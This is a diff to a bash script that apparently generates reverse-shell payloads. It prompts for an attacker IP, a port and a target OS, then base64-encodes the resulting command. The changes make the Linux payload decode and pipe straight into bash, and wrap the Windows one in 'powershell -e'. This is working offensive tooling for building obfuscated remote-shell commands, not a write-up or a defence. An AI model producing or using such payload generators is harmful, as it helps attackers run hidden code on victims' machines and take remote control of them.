@@ -1,17 +1,14 @@
 #!/bin/bash
 
 getIP() {
-    echo "IP:"
-    read IP
+    read -rp "IP: " IP
 }
 
 getPort() {
-    echo "PORT:"
-    read PORT 
+    read -rp "PORT: " PORT
 }
 getOS() {
-    echo "OS:"
-    read OS 
+    read -rp "OS: " OS
 }
 
 getShell() {
@@ -43,11 +40,11 @@ generate() {
 
     if $ENCODE 
     then
-        B64=$(echo "$CMD" | base64)
+        B64=$(echo "$CMD" | base64 | perl -pe "s/\s//g")
         # Convert OS to lowercase
         OS=$(echo "$OS" | tr "[:upper:]" "[:lower:]")
 
-        [[ "$OS" == "l"* ]] && CMD="\$(echo \"$B64\" | base64 -d)"
+        [[ "$OS" == "l"* ]] && CMD="echo \"$B64\" | base64 -d | bash"
         [[ "$OS" == "w"* ]] && CMD="powershell -e $B64"
     fi
 
